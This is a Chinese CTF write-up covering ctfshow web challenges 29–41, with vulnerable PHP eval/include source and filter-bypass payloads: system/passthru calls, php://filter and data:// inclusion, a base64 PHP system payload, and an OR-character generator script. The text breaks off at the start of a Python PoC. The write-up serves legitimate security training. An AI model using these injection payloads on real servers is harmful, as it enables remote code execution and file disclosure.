    <content type="html"><![CDATA[<p><del>未完待续</del> 已完结</p><span id="more"></span><h1 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:26:48<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现过滤了 flag，对 <code>preg_match</code> 进行绕过，并且 cat 也是被过滤了，所以构造 payload </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=system(&quot;ls&quot;);<br>?c=system(&quot;tac fla*.php&quot;);<br></code></pre></td></tr></table></figure><h1 id="Web-30"><a href="#Web-30" class="headerlink" title="Web 30"></a>Web 30</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:42:26<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了 <code>flag、system、php</code> ，那么对于命令执行函数我们除了 <code>system()</code> 还能用：<strong>exec()、shell_exec()、passthru()、popen()、反引号等</strong>，所以我们能构造 payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=passthru(&quot;tac fl??.ph*&quot;);<br></code></pre></td></tr></table></figure><p><code>tac</code> 还能换成 <code>tail</code></p><h1 id="Web-31"><a href="#Web-31" class="headerlink" title="Web 31"></a>Web 31</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:49:10<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单绕过，payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=passthru(&quot;tac%09fl**&quot;);<br></code></pre></td></tr></table></figure><p>因为空格和 <code>.</code> 也被过滤了，空格可以用 <code>%09</code> 或 <code>&#123;$IFS&#125;</code> 绕过，<code>flag.php</code> 能用通配符 <code>*</code> 绕过</p><h1 id="Web-32"><a href="#Web-32" class="headerlink" title="Web 32"></a>Web 32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:56:31<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>无法用替代绕过了，那么可以试试文件包含</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-33"><a href="#Web-33" class="headerlink" title="Web 33"></a>Web 33</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 02:22:27<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br>//<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>就比 web32 多过滤了个双引号，可以用上面的 payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-34"><a href="#Web-34" class="headerlink" title="Web 34"></a>Web 34</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:29<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>只是多过滤了一个 <code>:</code> ，所以还能用文件包含读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-35"><a href="#Web-35" class="headerlink" title="Web 35"></a>Web 35</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:23<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>比 web34 多过滤了**<code>&lt; 和 =</code>**，payload 和上一题一样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-36"><a href="#Web-36" class="headerlink" title="Web 36"></a>Web 36</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:16<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>比 Web35 多过滤了 <code>/</code> 和 <code>[0-9]</code>，数字被过滤了，那么我们换成字母</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[b]?&gt;&amp;b=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-37"><a href="#Web-37" class="headerlink" title="Web 37"></a>Web 37</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 05:18:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        include($c);<br>        echo $flag;<br>    <br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>eval()</code> 函数变成 <code>include()</code> 了,说明不能包含 flag ，试试用 php 伪协议，data:&#x2F;&#x2F;</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==<br>//&lt;?php system(&quot;tac flag.php&quot;);?&gt;<br></code></pre></td></tr></table></figure><h1 id="Web-38"><a href="#Web-38" class="headerlink" title="Web 38"></a>Web 38</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 05:23:36<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;<br>        include($c);<br>        echo $flag;<br>    <br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了一个 <code>php</code> 和 <code>file</code>，对 payload 没什么影响</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==<br></code></pre></td></tr></table></figure><h1 id="Web-39"><a href="#Web-39" class="headerlink" title="Web 39"></a>Web 39</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 06:13:21<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        include($c.&quot;.php&quot;);<br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>强制加了后缀，<code>include</code> 函数中 <code>$c</code> 后加了<code>.php</code> 后缀，那么也就是说在传入的参数后面会自动加上 <code>php</code> 后缀，payload 可以为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;);?&gt;<br></code></pre></td></tr></table></figure><h1 id="Web-40"><a href="#Web-40" class="headerlink" title="Web 40*"></a>Web 40*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 06:03:36<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了很多东西，只有空格，分号，括号还可以用，字母参数已经过滤完了，查看 hint</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>()))))); <span class="hljs-variable">GXYCTF</span>的禁止套娃 通过<span class="hljs-variable">cookie</span>获得参数进行命令执行</span><br><span class="hljs-function"><span class="hljs-variable">c</span>=<span class="hljs-title">session_start</span>();<span class="hljs-title">system</span>(<span class="hljs-title">session_id</span>());</span><br><span class="hljs-function"><span class="hljs-variable">passid</span>=<span class="hljs-variable">ls</span></span><br></code></pre></td></tr></table></figure><p>可以使用 hint 的方法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h1 id="Web-41"><a href="#Web-41" class="headerlink" title="Web 41"></a>Web 41</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: 羽<br># @Date:   2020-09-05 20:31:22<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:40:07<br># @email: 1341963450@qq.com<br># @link: https://ctf.show<br><br>*/<br><br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>    $c = $_POST[&#x27;c&#x27;];<br>if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;<br>        eval(&quot;echo($c);&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>只剩下了 <code>|</code> ，看的师傅博客，<a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p>rce_or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;<span class="hljs-comment">//替换成题目的正则</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure><p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</p><p>poc.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span 